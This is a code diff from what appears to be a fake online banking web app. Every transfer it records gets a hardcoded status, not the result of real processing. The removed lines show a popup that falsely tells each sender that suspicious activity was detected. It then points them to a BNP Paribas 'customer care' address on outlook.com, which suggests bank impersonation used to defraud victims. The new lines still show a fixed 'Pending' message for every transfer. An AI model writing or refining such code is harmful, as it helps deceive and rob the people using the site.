@@ -70,7 +70,7 @@ onAuthStateChanged(auth, async (user) => {
           name: name,
           bank: bank,
           amount: amount,
-          status: "Failed",
+          status: "Pending",
           recipientAddress: recipientAddress,
           bankAddress: bankAddress,
           routingNumber: routingNumber,
@@ -86,9 +86,9 @@ onAuthStateChanged(auth, async (user) => {
       setTimeout(function () {
         spinner.style.display = "none";
         Swal.fire({
-          title: "Transaction Failed",
-          text: "We Have Detected A Suspicious Activity Going On In Your Account Please Contact Customer Care At: Bnpparibascustomercare@outlook.com",
-          icon: "error",
+          title: "Pending",
+          text: "Transaction Pending",
+          icon: "warning",
         });
       }, 2000);
 
